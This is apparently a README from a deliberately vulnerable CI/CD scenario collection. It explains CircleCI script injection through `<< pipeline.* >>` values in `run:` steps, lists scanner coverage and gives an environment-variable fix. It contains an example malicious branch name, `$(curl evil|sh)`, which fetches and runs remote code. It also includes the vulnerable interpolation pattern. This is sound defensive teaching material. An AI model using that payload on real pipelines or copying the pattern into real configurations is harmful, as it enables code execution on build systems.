# Scenario 56: CircleCI — `run:` injection via `<< pipeline.* >>`

**Provider:** CircleCI · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`.circleci/config.yml`](.circleci/config.yml)

## The pattern

```yaml
- run: echo "Building << pipeline.git.branch >>"
```

`<< pipeline.git.branch >>`, `<< pipeline.git.tag >>`, and API-supplied
`<< parameters.* >>` are attacker-controllable and are interpolated directly
into the `run:` shell command.

## How an attacker exploits it

A branch named `$(curl evil|sh)` (or a parameter with shell metacharacters)
executes on the executor — the same class as scenarios
[02](../02-script-injection-issue-title/README.md) / [31](../31-script-injection-head-ref/README.md).

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `CC-002` — script injection via untrusted context |
| Checkov | — |

> pipeline-check 1.9.0 added `CC-002`, which flags the `<< pipeline.* >>` splice into a `run:` step.

## Fix

Pass untrusted values through the environment and reference them quoted:
`environment: { BRANCH: << pipeline.git.branch >> }` then
`run: echo "$BRANCH"` — never interpolate directly into the command string.

## References

- CircleCI — Pipeline values and parameters: https://circleci.com/docs/guides/orchestrate/pipeline-variables/
